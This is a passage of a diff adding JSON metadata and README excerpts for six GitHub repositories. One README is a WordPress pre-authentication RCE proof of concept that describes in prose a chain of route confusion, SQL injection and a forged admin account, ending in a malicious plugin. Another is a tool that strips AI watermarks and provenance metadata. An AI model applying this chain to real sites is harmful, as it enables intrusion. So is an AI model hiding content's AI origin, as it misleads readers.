+      "readme": "<p align=\"center\">\n  <img src=\"docs/assets/banner.webp\" alt=\"Booklin, the book-to-skill wizard, holding an open book whose pages scatter into sparkles that settle into an ordered grid\" width=\"100%\">\n</p>\n\n<h1 align=\"center\">book-to-skill</h1>\n\n<p align=\"center\">\n  <strong>Turn any technical book, document folder, or collection of sources into a unified agent skill — ready to study, reference, and use while you work in GitHub Copilot CLI, Amp, or Claude Code.</strong>\n</p>\n\n<p align=\"center\">\n  <img src=\"https://img.shields.io/badge/Agent_Skills-Open_Standard-blueviolet?style=for-the-badge\" alt=\"Agent Skills standard\">\n  <img src=\"https://img.shields.io/badge/PDF%20%E2%80%A2%20EPUB%20%E2%80%A2%20DOCX%20%E2%80%A2%20MD%20%E2%80%A2%20HTML%20%E2%80%A2%20RTF%20%E2%80%A2%20MOBI-supported-green?style=for-the-badge\" alt=\"Formats supported\">\n  <img src=\"https://img.shields.io/badge/License-MIT-blue?style=for-the-badge\" alt=\"MIT License\">\n</p>\n\n<p align=\"center\">\n  <a href=\"#-why\">Why</a> ·\n  <a href=\"#-what-it-generates\">What it generates</a> ·\n  <a href=\"#-beyond-books\">Beyond books</a> ·\n  <a href=\"docs/how-it-works.md\">How it works</a> ·\n  <a href=\"docs/usage.md\">Usage</a> ·\n  <a href=\"#-install\">Install</a> ·\n  <a href=\"docs/faq.md\">FAQ</a> ·\n  <a href=\"docs/performance.md\">Performance</a> ·\n  <a href=\"CHANGELOG.md\">Changelog</a>\n</p>\n\n<p align=\"center\">\n  <strong>24×–51× fewer tokens than dumping the book into context</strong> to answer one question, measured on real books.\n</p>\n\n<p align=\"center\">\n<code>pip install -e .</code><br>\n<code>book-to-skill install</code><br>\n<code>book-to-skill &lt;path-to-book.pdf&gt;</code>\n</p>\n\n**How it works, in 3 steps:**\n\n1. **Point** it at a file, folder, or glob — `book-to-skill ./my-book.pdf`\n2. **It distills** the book into a skill — frameworks, decision rules, anti-patterns, and per-chapter files. Structure, not a summary.\n3. **Your agent loads it on demand** — ask `/my-book replication` and it reads the right chapter and answers from the real content, no hallucination.\n\n---\n\n## Install\n\n**As agent skill (recommended):**\n\n```powershell\npip install -e .\nbook-to-skill install\n```\n\nCopies the skill into `~/.claude/skills/book-to-skill`, `~/.agents/skills/book-to-skill`, `~/.copilot/skills/book-to-skill` (and related paths).\n\n**Convert a book:**\n\n```powershell\nbook-to-skill path\\to\\book.pdf\nbook-to-skill \"path\\to\\docs\\*.epub\" my-skill-slug\nbook-to-skill --check\n```\n\n**Other commands:**\n\n```powershell\nbook-to-skill help\nbook-to-skill list\nbook-to-skill readme\nbook-to-skill ui\n```\n\nOn the first two CLI runs (if `ui/book-to-skill-ui.zip` is present), the GUI is unpacked and launched automatically with `cwd = ui/`. After that it stays quiet. Force with `book-to-skill ui`.\n\nManual skill install (any host):\n\n```bash\ngit clone https://github.com/Leutenegger/book-to-skill.git ~/.claude/skills/book-to-skill\n# Copilot CLI: ~/.copilot/skills/\n# Amp / cross-agent: ~/.agents/skills/\n```\n\n---\n\n## Why\n\nYou buy a great technical book. You read it once. Three months later you can't remember chapter 7 existed.\n\nThe usual workarounds don't help:\n\n- \"Let me just search the PDF\" → you get a list of pages, not answers\n- \"I'll ask the agent about this book\" → it either hallucinates or says it doesn't have the content\n- \"I'll take notes as I read\" → you end up with a 200-line doc you never open again\n\n**book-to-skill solves this by turning the book into a structured skill your agent loads on demand.**\n\nOnce installed, type `/your-book-slug replication` and the agent reads the right chapter and answers from the actual content. No hallucination. No digging through PDFs.\n\nWorks with any host that supports the open [Agent Skills](https://github.com/agentskills/agentskills) standard — GitHub Copilot CLI, Amp, and Claude Code all read the same `SKILL.md` format.\n\n---\n\n## What it generates\n\nRunning `book-to-skill your-book.pdf` (or a folder, glob, or list of files) creates a full skill in your agent's skills directory:\n\n| File | Purpose | Size |\n|------|---------|------|\n| `SKILL.md` | Core mental models + chapter index | ~4,000 tokens |\n| `chapters/ch01-*.md` … | One file per chapter, loaded on-demand | ~1,000 tokens each |\n| `glossary.md` | Key terms with chapter refs | ~1,500 tokens |\n| `patterns.md` | Techniques, algorithms, design patterns | ~2,000 tokens |\n| `cheatsheet.md` | Decision tables and quick-reference rules | ~1,000 tokens |\n\nChapter files are loaded on-demand — they don't count against the skill budget until you ask about that topic.\n\n---\n\n## Beyond books\n\nThe name says \"book\", but the input is any structured prose:\n\n- **Internal documentation** — ADRs, runbooks, onboarding guides\n- **Brand & design systems** — voice guidelines, component principles\n- **Research clusters** — papers + notes, updated as new material lands\n- **Specs & standards** — RFCs, API contracts, compliance docs\n\nIf you re-open a document often enough to wish you'd memorized it, it's a candidate.\n\n---\n\n## How it works\n\n",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:32.387142"
+  },
+  {
+    "basic_info": {
+      "name": "MoonEP",
+      "full_name": "MoonshotAI/MoonEP",
+      "owner": "MoonshotAI",
+      "description": "MoonEP: A Perfectly Balanced Expert Parallelism Library via Dynamic Redundant Experts",
+      "url": "https://github.com/MoonshotAI/MoonEP",
+      "clone_url": "https://github.com/MoonshotAI/MoonEP.git",
+      "ssh_url": "git@github.com:MoonshotAI/MoonEP.git",
+      "homepage": "",
+      "created_at": "2026-07-24T09:07:21Z",
+      "updated_at": "2026-08-21T16:50:53Z",
+      "pushed_at": "2026-08-13T09:30:40Z"
+    },
+    "stats": {
+      "stars": 1096,
+      "forks": 121,
+      "watchers": 1096,
+      "open_issues": 20,
+      "size": 480
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 490589,
+        "Cuda": 24852
+      },
+      "license": "MIT License",
+      "topics": []
+    },
+    "content": {
+      "readme": "# MoonEP\n\nMoonEP is an Expert Parallelism communication library that keeps token loads perfectly balanced across ranks via dynamic redundant experts.\n\n**Notation**: `S` = input tokens per rank, `K` = routed top-k per token.\n\n1. **Perfect balance**: every rank receives exactly `S × K` tokens, no matter how skewed the routing is. A small number of redundant experts is planned online from the current router outputs and prefetched before expert computation; their gradients are reduced back to their home ranks in the backward pass.\n2. **Online planning**: a near-optimal GPU planning kernel with negligible overhead\n3. **Zero copy and static shapes**: fused permute/unpermute — tokens are sent directly to their expert-grouped positions on remote ranks and buffer views are returned to the computation. Only a fixed `S × K` buffer is needed, and statically known shapes eliminate per-layer MoE host synchronization.\n\n## Performance\n\nBoth benchmarks run on H20 with EP=8, sweeping the router imbalance:\n\n$$\\text{maxvio} = \\max_e \\left( \\frac{T_e}{\\bar{T}} \\right) - 1$$\n\nwhere $T_e$ is the number of tokens routed to expert $e$, and $\\bar{T}$ is the expected tokens per expert under perfect balance (maxvio = 0 means perfectly balanced).\n\n**Communication vs DeepEP v2** ([benchmarks/bench_vs_deepep.py](benchmarks/bench_vs_deepep.py)):\n\n<img src=\"figure/comm_vs_deepep.png\" alt=\"MoonEP vs DeepEP v2 communication\" width=\"800\">\n\n- **Zero copy makes raw communication faster**: tokens are written directly to their final expert-grouped positions on remote ranks — no permute in, no permute out — and views of the communication buffer are handed straight to the computation, eliminating the comm-buffer → user-buffer copy that dominates the epilogue. MoonEP's comm time is consistently below DeepEP v2 at every imbalance level.\n- **Perfect balance makes it immune to imbalance**: MoonEP's comm time stays almost flat as maxvio grows, while DeepEP v2 — whose latency is set by the hottest rank — degrades steadily.\n- **The comparison counts MoonEP's extra kernels**: MoonEP adds planning and weight-prefetch kernels that DeepEP does not need, and they are already stacked in the bars above. Even with the whole critical path included, total dispatch time is on par with DeepEP v2's dispatch alone and pulls ahead under imbalance, while combine is significantly faster at every level.\n\n**End-to-end training**:\n\n<img src=\"figure/e2e_vs_deepep.png\" alt=\"MoonEP vs DeepEP e2e training\" width=\"800\">\n\n- **DeepEP degrades with imbalance**: the hottest ranks receive more tokens, so iteration time climbs steadily as maxvio grows; meanwhile the ever-changing activation shapes fragment GPU memory, until training OOMs at high imbalance.\n- **MoonEP is unaffected**: every rank always computes exactly `S × K` tokens per layer, so iteration time stays flat at every imbalance level; fully static memory shapes mean no fragmentation, and training never OOMs.\n\n## Supported Devices\n\n- NVIDIA GPU\n- Zhenwu PPU (under review, coming soon)\n\n## Usage\n\n### Integration\n\n**Notation**: `S` = input tokens per rank, `K` = routed top-k per token, `E` = total routed experts in the EP group, `R` = number of EP ranks (EP comm size), `B` = weight prefetch slots per rank, `NvS` = dispatched token slots per rank (`S × K` real tokens plus per-VM-group padding), `H` = hidden size, `H'` = expert FFN intermediate size.\n\nMoonEP's contract with a training or inference framework is **one contiguous symmetric-memory weight tensor per expert projection, plus a planner-produced `cu_seqlens`**. The VM group GEMM consumes a single `[E+B, H, H']` weight tensor; `cu_seqlens[E+B]` (returned by `dispatch`) selects which expert rows are active for the current step.\n\n#### Weight buffer\n\n<img src=\"figure/weight_buffer.png\" alt=\"MoonEP weight buffer layout\" width=\"1000\">\n\nFor each expert projection (gate/up/down), every layer holds **one contiguous VMM range** `[E+B, H, H']`, identically laid out on every rank. Contiguity is a hard requirement: the group GEMM addresses experts purely by row index.\n\n- **Rows `[0, E)`: all ranks' local experts** — `E/R` rows per rank. Each chunk physically *is* the home rank's parameter memory, mapped everywhere via symmetric memory.\n- **Rows `[E, E+B)`: local prefetch slots**, filled by `buffer.prefetch_weight`; the planner points duplicated experts' token segments at these slots via `cu_seqlens`. Their physical memory comes from a process-global pool shared by all layers, so the extra cost is `B` expert weights per projection in total, not per layer.\n\n**How to set B.**\n\n- **Training**: must use **`B = E/R`** — the planner duplicates experts from at most one remote home group per rank (≤ `E/R` experts), so every expert the group GEMM touches is local.\n- **Inference** (prefetch only, no gradients): `B < E/R` is allowed, **`B = 3–4` is recommended**. If a rank ever needs more distinct remote experts than `B`, the group GEMM reads the overflow weights straight from the home rank thr",
+      "default_branch": "master"
+    },
+    "fetched_at": "2026-08-23T02:19:33.767824"
+  },
+  {
+    "basic_info": {
+      "name": "agent-vision-toolkit",
+      "full_name": "Anionex/agent-vision-toolkit",
+      "owner": "Anionex",
+      "description": "为纯文本模型\"看图“设计更好的视觉工具箱和技能，支持多图理解，图片问答，前端UI还原、GUI 自动化等，并可选无缝接入多个主流agent，直接识别粘贴图片｜ A vision toolkit and skill designed for text-only llms — image Q&A, long-screenshot OCR, frontend UI restoration, and GUI automation, with optional seamless integration for Codex, Claude Code, Pi, Oh My Pi, and OpenCode",
+      "url": "https://github.com/Anionex/agent-vision-toolkit",
+      "clone_url": "https://github.com/Anionex/agent-vision-toolkit.git",
+      "ssh_url": "git@github.com:Anionex/agent-vision-toolkit.git",
+      "homepage": "https://agent-vision.anionex.me",
+      "created_at": "2026-08-01T10:00:13Z",
+      "updated_at": "2026-08-22T18:15:10Z",
+      "pushed_at": "2026-08-21T06:17:49Z"
+    },
+    "stats": {
+      "stars": 1095,
+      "forks": 38,
+      "watchers": 1095,
+      "open_issues": 6,
+      "size": 27389
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 387996,
+        "CSS": 47358,
+        "JavaScript": 40976,
+        "TypeScript": 29093,
+        "HTML": 1811
+      },
+      "license": "MIT License",
+      "topics": [
+        "agent",
+        "agent-skills",
+        "claude-code",
+        "codex",
+        "computer-use",
+        "deepseek",
+        "dsh-plugin",
+        "glm",
+        "harness-engineering",
+        "multimodal",
+        "opencode",
+        "text-only-llm",
+        "vision",
+        "vision-language-model"
+      ]
+    },
+    "content": {
+      "readme": "<p align=\"center\">\n  <img src=\"assets/hero.png\" alt=\"agent-vision-toolkit — Give text-only LLM agents eyes.\" width=\"100%\">\n</p>\n\n<div align=\"center\">\n\n# agent-vision-toolkit\n<a href=\"https://trendshift.io/repositories/99395?utm_source=trendshift-badge&amp;utm_medium=badge&amp;utm_campaign=badge-trendshift-99395\" target=\"_blank\" rel=\"noopener noreferrer\"><img src=\"https://trendshift.io/api/badge/trendshift/repositories/99395/daily?language=Python\" alt=\"Anionex%2Fagent-vision-toolkit | Trendshift\" width=\"250\" height=\"55\"/></a>\n\n\n[![X (Twitter)](https://img.shields.io/badge/-@anion__ex-000000?style=flat-square&logo=x&logoColor=white)](https://x.com/anion_ex)\n[![GitHub stars](https://img.shields.io/github/stars/Anionex/agent-vision-toolkit?style=flat-square&logo=github)](https://github.com/Anionex/agent-vision-toolkit/stargazers)\n[![GitHub forks](https://img.shields.io/github/forks/Anionex/agent-vision-toolkit?style=flat-square&logo=github)](https://github.com/Anionex/agent-vision-toolkit/forks)\n[![License: MIT](https://img.shields.io/github/license/Anionex/agent-vision-toolkit?style=flat-square&color=4EAA25)](https://github.com/Anionex/agent-vision-toolkit/blob/main/LICENSE)\n\n[![Agent Skills](https://img.shields.io/badge/Agent%20Skills-Standard-green?style=flat-square)](https://agentskills.io)\n[![Extensions](https://img.shields.io/badge/-Extensions-3178C6?style=flat-square)](https://github.com/Anionex/agent-vision-toolkit/tree/main/extensions)\n[![Shell](https://img.shields.io/badge/-Shell-4EAA25?style=flat-square&logo=gnubash&logoColor=white)](https://github.com/Anionex/agent-vision-toolkit/tree/main/bin)\n\n**What it thinks is what it sees — give any text-only coding agent eyes: image Q&A, long-screenshot OCR, frontend UI restoration, and GUI automation, as a vision toolkit plus a skill, with optional drop-in integration for Codex, Claude Code, Pi, Oh My Pi, and OpenCode.**\n\n🎯 An agent's vision capability doesn't have to live in the model — it can live in the harness.\n\n🌐 [**中文**](README_CN.md) ｜ **English**\n\n</div>\n\nIf your agent already runs on a text-only model such as DeepSeek but is held back by the lack of multimodality — unable to see images, with every attempt to use an image tool blocked by the system — this repository provides tools, skills, and proxy integrations that let text-only models handle visual tasks on equal or even better footing. The goal is to make the experience of using a text-model agent as seamless as using a multimodal one, and ultimately let a tool-equipped text-model agent outperform a native multimodal agent that does not use this toolkit and its methods.\n\nThis repository provides two kinds of components:\n1. **Vision tool CLIs** — multiple CLIs, plus a skill that teaches the agent when to use each one. Any agent that can invoke a shell can use them.\n2. **Seamless integration** *(optional upgrade)* — a transparent local proxy and single-file native plugins, so **images we paste and the agent's built-in image tools both work seamlessly**, with no extra tool installation or additional prompting.\n\nAll code has been verified in real Codex + DeepSeek sessions, and the same pipeline has been live-verified end-to-end in Claude Code, Pi, Oh My Pi, and OpenCode.\n\n> If this project helps you or gives you some inspiration, feel free to star🌟 & fork.\n\n## ❤️ Sponsor\n\n> Want to sponsor this project? See [FUNDING.md](FUNDING.md) or email davidyang042@gmail.com.\n\n<details open>\n<summary>Click to collapse</summary>\n\n<table>\n<tr>\n<td width=\"220\"><a href=\"https://aihubmix.com/?aff=5wj6sgx8\"><img src=\"assets/logo_aihubmix.png\" alt=\"AIHubMix\" height=\"48\"></a></td>\n<td>Thanks to <a href=\"https://aihubmix.com/?aff=5wj6sgx8\">AIHubMix</a> for sponsoring this project! AIHubMix is a stable, high-concurrency AI model API gateway that connects Claude, GPT, Gemini, DeepSeek, and other mainstream models through a single API key, compatible with multiple protocols, with <b>free model options</b> available. Users in China can use it via the <a href=\"https://inferera.com/?aff=5wj6sgx8\">China entry</a>, and users abroad via the <a href=\"https://aihubmix.com/?aff=5wj6sgx8\">Global entry</a>.</td>\n</tr>\n</table>\n\n</details>\n\n## Latest Update\n\n**2026-08-18 — Skill renamed:** the included agent skill is now `vision-skills` (formerly `vision-tools`), so the name describes the capability rather than the underlying tools.\n\n**2026-08-13 — Native DeepSeek Harness support is now available.** The new [`dsh-vision-toolkit`](https://github.com/Anionex/dsh-vision-toolkit) linked package brings this toolkit into DSH Web and Headless profiles as a native Profile Bundle. It provides 10 structured visual tools for intent-aware image Q&A, grounding, detection, tracing, cropping, pixel diff, long-screenshot OCR, foreground extraction, dominant-color analysis, and HTML screenshots, while adding DSH Credentials, a managed isolated runtime, previewable Artifacts, Web Settings, and Agent-scoped progressive tool exposure.\n\nThe package is trac",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:35.083437"
+  },
+  {
+    "basic_info": {
+      "name": "ai-copywriter",
+      "full_name": "mikiarlo3/ai-copywriter",
+      "owner": "mikiarlo3",
+      "description": "An AI copywriter that uses real copywriting skills + real marketing knowledge with human tone.",
+      "url": "https://github.com/mikiarlo3/ai-copywriter",
+      "clone_url": "https://github.com/mikiarlo3/ai-copywriter.git",
+      "ssh_url": "git@github.com:mikiarlo3/ai-copywriter.git",
+      "homepage": null,
+      "created_at": "2026-07-24T19:52:13Z",
+      "updated_at": "2026-08-22T22:03:02Z",
+      "pushed_at": "2026-08-01T16:30:08Z"
+    },
+    "stats": {
+      "stars": 1090,
+      "forks": 44,
+      "watchers": 1090,
+      "open_issues": 2,
+      "size": 252
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 1960
+      },
+      "license": "MIT License",
+      "topics": []
+    },
+    "content": {
+      "readme": "![AI copywriter. Human tone. Explains extreme concepts easily. enso](assets/banner.png)\n\n# AI Copywriter\n\nby [Mickey Haslavsky](https://github.com/mikiarlo3)\n\nA portable agent skill that does the two halves of the copy job most tools split apart: it writes copy that earns attention (clickbait titles, short descriptions, microcopy, subject lines), and it strips out every sign of AI-generated writing so the result reads like a person wrote it. It is plain Markdown, so it runs in any harness that supports skill-style instructions.\n\nIt is built on [blader's Humanizer](https://github.com/blader/humanizer), which packaged Wikipedia's \"Signs of AI writing\" guide into 33 detectable, fixable patterns. Those 33 patterns are all still here, unchanged. What this skill adds is the other direction: not just cleaning up prose after the fact, but writing headlines, product blurbs, and button labels that convert without tripping a single one of those patterns.\n\nThe copywriting method comes from [enso.bot/research](https://enso.bot/research), where the enso team studies how to communicate through marketing in the best possible way. The short version of what that research keeps finding: copy works when it starts from the feeling of the person on the other end and explains the concept in the simplest possible words. This skill is that finding, made operational.\n\n## How it thinks\n\nA really good copywriter is not thinking about the product. They are thinking about the person on the other end. That is the core of the communication research at [enso.bot/research](https://enso.bot/research), and it is how this skill works: before writing a single word, it answers two questions.\n\n**What is that person feeling at the exact moment the line reaches them?** Not the demographic, the person in the moment. A headline reaches someone mid-scroll, half a second from gone. An error message reaches someone whose task just broke and who might be blaming themselves. An empty state reaches someone new who is quietly worried they're doing it wrong. A subject line reaches someone deleting on reflex. The feeling decides the tone, the length, and what comes first: a frustrated person needs the fix in the first three words; a skeptical person needs proof before adjectives. If the skill doesn't know the feeling, it asks you who the reader is and what just happened to them.\n\n**What is the simplest way to explain this?** If the product can't be described in the words you'd use across a kitchen table, it isn't understood well enough to sell yet, and the skill will keep asking what it actually does until it can. Simple means short, common words, one thought per sentence, and nothing the reader has to look up or reread. The reader never does any work. The writer does all of it.\n\nTo get those answers, the skill interviews before it writes. It asks for three things up front (in one batch, skipping whatever you already told it): the ICP (who exactly this is for, down to what they'd type into a search box at 11pm), the category (the mental shelf the reader files you on, which decides who you're compared against), and the story (the real moment behind the copy, with real numbers). Then it pressure-tests the story before drafting: is there a surprising number, a moment it almost failed, a belief that turned out wrong, something you'd tell at dinner unprompted? If not, it keeps digging with you until a true story that's also interesting shows up, because writing from a weak story produces generic copy no craft can save.\n\nAnd it doesn't stop at filled-in fields. If what it knows about the ICP wouldn't surprise a colleague, if it can't tell what's table stakes in your category versus what would raise an eyebrow, if it can't write the reader's 11pm search query word for word, it comes back with follow-ups (\"What do they complain about, in the words they'd use?\", \"What claim would nobody else in the category dare to make?\") instead of writing around the gap. Answers that are present but generic get questioned just as proactively as answers that are missing.\n\nEvery variant it produces is an answer to those two questions, and when it recommends one, the reason is the reader's feeling, never \"this one is punchier.\"\n\n## Why both jobs in one skill\n\nAsk a model for a headline and you get \"Unlock the Ultimate Guide to Revolutionize Your Workflow.\" Ask it to tone that down and you get something so flat nobody clicks it. The two failure modes come from the same place: the model is thinking about the product and its adjectives, not about the reader and their half-second of attention.\n\nCopy that works is specific. \"We cut our AWS bill by $40,000 in one afternoon\" gets the click because the promise is concrete and checkable. \"Game-changing cloud savings\" gets scrolled past because the reader's filter deleted it before it registered. The humanizer rules aren't a constraint on the copywriting; they're most of what makes it good.\n\nThe skill also refuses to invent product facts. If th",
+      "default_branch": "claude/humanizer-copywriting-skill-u5x4vd"
+    },
+    "fetched_at": "2026-08-23T02:19:36.431008"
+  },
+  {
+    "basic_info": {
+      "name": "watermarks-remover",
+      "full_name": "Leutenegger/watermarks-remover",
+      "owner": "Leutenegger",
+      "description": "Remove multi-vendor AI provenance traces: Unicode text sanitization, statistical rewriting techniques, and C2PA/metadata stripping from PNG/JPEG/SVG/PDF/DOCX/HTML/MD files",
+      "url": "https://github.com/Leutenegger/watermarks-remover",
+      "clone_url": "https://github.com/Leutenegger/watermarks-remover.git",
+      "ssh_url": "git@github.com:Leutenegger/watermarks-remover.git",
+      "homepage": "",
+      "created_at": "2026-08-19T15:20:24Z",
+      "updated_at": "2026-08-22T21:16:46Z",
+      "pushed_at": "2026-08-19T15:23:40Z"
+    },
+    "stats": {
+      "stars": 934,
+      "forks": 95,
+      "watchers": 934,
+      "open_issues": 4,
+      "size": 306
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 792388,
+        "Shell": 19192,
+        "PowerShell": 15280,
+        "Makefile": 4652,
+        "Dockerfile": 2886
+      },
+      "license": "MIT License",
+      "topics": [
+        "claude",
+        "claude-code",
+        "claude-skills",
+        "codex",
+        "codex-cli",
+        "codex-desktop",
+        "codex-plugin",
+        "codex-skill",
+        "codex-skills",
+        "grok",
+        "grok-45",
+        "grok-ai",
+        "grok-build",
+        "grok-cli",
+        "watermark",
+        "watermark-detection",
+        "watermark-tools",
+        "watermarks"
+      ]
+    },
+    "content": {
+      "readme": "```\n_ _ _ ____ ___ ____ ____ _  _ ____ ____ _  _ ____    ____ ____ _  _ ____ _  _ ____ ____\n| | | |__|  |  |___ |__/ |\\/| |__| |__/ |_/  [__  __ |__/ |___ |\\/| |  | |  | |___ |__/\n|_|_| |  |  |  |___ |  \\ |  | |  | |  \\ | \\_ ___]    |  \\ |___ |  | |__|  \\/  |___ |  \\\n```\n\n# watermarks-remover\n\n<!-- logo: figlet -d .figlet -f cybermedium -w 120 \"watermarks-remover\" -->\n\n[![CI](https://github.com/guillaumemeyer/watermarks-remover/actions/workflows/ci.yml/badge.svg)](https://github.com/guillaumemeyer/watermarks-remover/actions/workflows/ci.yml)\n[![Release](https://img.shields.io/github/v/release/guillaumemeyer/watermarks-remover)](https://github.com/guillaumemeyer/watermarks-remover/releases)\n[![Stars](https://img.shields.io/github/stars/guillaumemeyer/watermarks-remover)](https://github.com/guillaumemeyer/watermarks-remover/stargazers)\n[![Forks](https://img.shields.io/github/forks/guillaumemeyer/watermarks-remover)](https://github.com/guillaumemeyer/watermarks-remover/forks)\n\nAgent skill + stdlib Python service to strip **multi-vendor AI provenance marks** from text and files — for privacy and hygiene on content **you own**. The skill is a thin client: it drives the machinery over HTTP, so the agent host needs no Python.\n\n| Layer | Target | How |\n| --- | --- | --- |\n| **A** | Invisible Unicode, exotic spaces, bidi, tag chars | Deterministic Python scripts |\n| **B** | Statistical (token-sampling) text watermarks | Agent rewrite + optional `rewrite_text.py` hook |\n| **Files** | C2PA / EXIF / XMP / doc props | PNG, JPEG, WebP, AVIF, HEIC, BMP, GIF, TIFF, SVG, PDF, DOCX, XLSX, PPTX, EPUB, ODT, HTML, Markdown, MP4/MOV/M4A/M4V, WAV, MP3 |\n\nVendors / ecosystems (class-level): **Claude**, **Gemini / SynthID-Text**, **OpenAI** provenance surfaces, **open-LLM** Kirchenbauer-style marks.\n\n**Latest release:** [v0.5.0](https://github.com/guillaumemeyer/watermarks-remover/releases/tag/v0.5.0)\n\nSkill path: [`skills/remove-ai-marks/`](skills/remove-ai-marks/)  \nService path: [`service/`](service/)  \n(migration: formerly `remove-claude-marks`; slash alias `/remove-claude-marks` still documented)\n\n## Install (agent skill)\n\nThe skill ships **no code** — it calls the service over HTTP. Install the skill (markdown only) and start the service, then set `WATERMARKS_SERVICE_URL` if it is not `http://127.0.0.1:8765`.\n\n```bash\n# Grok Build / project-local\nmkdir -p .grok/skills\nln -sfn \"$(pwd)/skills/remove-ai-marks\" .grok/skills/remove-ai-marks\n\n# User-global Grok\nmkdir -p ~/.grok/skills\nln -sfn \"$(pwd)/skills/remove-ai-marks\" ~/.grok/skills/remove-ai-marks\n```\n\nInvoke with `/remove-ai-marks` or ask to “strip AI watermarks / C2PA / Claude marks / SynthID-class text.”\n\n### Optional Cursor text-only skill\n\n[`skills/clean-user-facing-text/`](skills/clean-user-facing-text/) is a\nself-contained Cursor skill for authorized manuscripts, documentation, and web\ncopy. It excludes image, C2PA, service, and external-model tooling.\n\nInstall it into `~/.cursor/skills/clean-user-facing-text`:\n\n```bash\npython3 install_skill.py\n```\n\nOn Windows, use `py install_skill.py`. The `install-skill.sh` wrapper is\nprovided for macOS/Linux shells. Existing installations are preserved unless\nyou pass `--force`; replacement is staged first and the previous install is\nkept as a uniquely named backup.\n\nSkill invocation is model-selected. Projects that explicitly adopt this\nworkflow can also copy the optional rule:\n\n```bash\nmkdir -p /path/to/project/.cursor/rules\ncp integrations/cursor/clean-user-facing-text.mdc \\\n  /path/to/project/.cursor/rules/clean-user-facing-text.mdc\n```\n\nFor all projects, put the same instruction in Cursor **User Rules** instead.\nRules improve consistency but remain model instructions; Cursor does not expose\na deterministic pre-send filter for final chat responses.\n\n### Start the service\n\nThe fastest path is a local HTTP server (Python 3.10+ stdlib only — no deps, no Docker):\n\n```bash\nmake serve                 # http://127.0.0.1:8765\n# or directly:\npython3 service/scripts/server.py --host 127.0.0.1 --port 8765\n```\n\n### Windows (no Docker)\n\nSee [docs/windows-autostart.md](docs/windows-autostart.md) for auto-starting the service at Windows login without Docker.\n\nFor the whole infra (core + optional harness/heavy backends), see [Docker / compose](#docker--compose) below.\n\nOptional system tools (auto-used when present — preinstalled in the core Docker image):\n\n| Tool | Role |\n| --- | --- |\n| [`c2patool`](https://github.com/contentauth/c2pa-rs/tree/main/cli) | Inspect C2PA manifests |\n| [`exiftool`](https://exiftool.org/) | Residual metadata strip (esp. **PDF**) |\n| [`qpdf`](https://qpdf.sourceforge.io/) | Structural PDF rebuild — **required** for a real PDF strip (see below) |\n\nCore scripts need **Python 3.10+** stdlib only. Layer B model calls are optional.\n\n## Quick use (scripts)\n\n```bash\nSCRIPTS=service/scripts\n\n# Unified inspect / clean\npython3 \"$SCRIPTS/inspect_file.py\" draft.md\npython3 \"$SCRIPTS/clean_file.py\" draft.md -o draft.cleaned.md\np",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:37.812172"
+  },
+  {
+    "basic_info": {
+      "name": "wp2shell-PoC",
+      "full_name": "sowarma/wp2shell-PoC",
+      "owner": "sowarma",
+      "description": "CVE-2026-63030 & CVE-2026-60137 RCE chain proof-of-concept",
+      "url": "https://github.com/sowarma/wp2shell-PoC",
+      "clone_url": "https://github.com/sowarma/wp2shell-PoC.git",
+      "ssh_url": "git@github.com:sowarma/wp2shell-PoC.git",
+      "homepage": "",
+      "created_at": "2026-08-05T12:48:03Z",
+      "updated_at": "2026-08-20T13:11:47Z",
+      "pushed_at": "2026-08-20T10:15:52Z"
+    },
+    "stats": {
+      "stars": 914,
+      "forks": 215,
+      "watchers": 914,
+      "open_issues": 2,
+      "size": 31
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 11939
+      },
+      "license": null,
+      "topics": [
+        "cve",
+        "cve-2026-60137",
+        "cve-2026-63030",
+        "data-analysis",
+        "wp2shell",
+        "wp2shell-poc"
+      ]
+    },
+    "content": {
+      "readme": "# wp2shell-PoC\n\n> **⚠ This tool is created solely for educational or bug bounty purpose only. Unauthorized use outside of controlled environments is strictly prohibited.**\n\n\n## Overview\n\nProof-of-concept for the wp2shell vulnerability chain affecting WordPress Core, combining CVE-2026-63030 and CVE-2026-60137. The project demonstrates the interaction between the REST API Batch route confusion vulnerability and a WP_Query SQL injection, resulting in an unauthenticated path to full WordPress compromise and remote code execution (RCE).\n\n**Read the full advisory [here](https://wp2shell.com/)**\n\n# How it works\n\n**wp2shell** is a pre-authentication RCE chain in WordPress core, combining CVE-2026-63030 (route confusion in the batch REST endpoint) and CVE-2026-60137 (SQL injection in WP_Query).\n\n**The route confusion:** `/wp-json/batch/v1` processes multiple sub-requests via parallel `$matches` and `$validation` arrays indexed by position. A sub-request with a malformed path (e.g., `http://:`) is appended to `$validation` but not `$matches` due to a `continue` statement, desynchronizing the arrays. Later requests are dispatched under the handler meant for the *next* request, bypassing schema validation and permission checks.\n\n**The SQL injection:** Two nested batch calls exploit this. The outer batch bypasses the method allow-list (normally blocking GET). The inner batch delivers a scalar `author_exclude` string to `GET /wp/v2/posts` - the desync routes it past validation, and `WP_Query` interpolates the unsanitized string directly into SQL, yielding a UNION-based blind injection.\n\n**Cache poisoning:** The SQLi returns forged `WP_Post` objects, which WordPress caches in-memory. These fake posts contain `[embed]` shortcodes that cause WordPress to create real `oembed_cache` database rows from the fake references.\n\n**Changeset escalation:** Using the SQLi, the attacker forges a `customize_changeset` post in-memory with `\"user_id\": 1` in its JSON. A cycle-detection gadget triggers `wp_update_post()` without overwriting `post_content`, preserving the attacker's payload. Applying the changeset temporarily assumes the administrator's identity.\n\n**Hook re-entry:** A fabricated post with status `parse` and type `request` fires the `parse_request` hook, replaying the entire batch request with the assumed admin role. This time, a `POST /wp/v2/users` sub-request succeeds, creating a new admin account.\n\n**Code execution:** The attacker logs in as the created admin and uploads a malicious plugin to run arbitrary commands.\n\n# Affected versions\n\n| Version| Status |\n|---------------|--------|\n| WordPress 6.9.0 – 6.9.4 | Vulnerable |\n| WordPress 7.0.0 – 7.0.1 | Vulnerable |\n| WordPress 6.9.5 | Fixed |\n| WordPress 7.0.2+ | Fixed |\n\n\n# Usage\n\n**To use this PoC, the only requirement is Python 3.8+.**\n\nRun it from the repository directory to perform a vulnerability check:\n\n```bash\nwp2shell.py 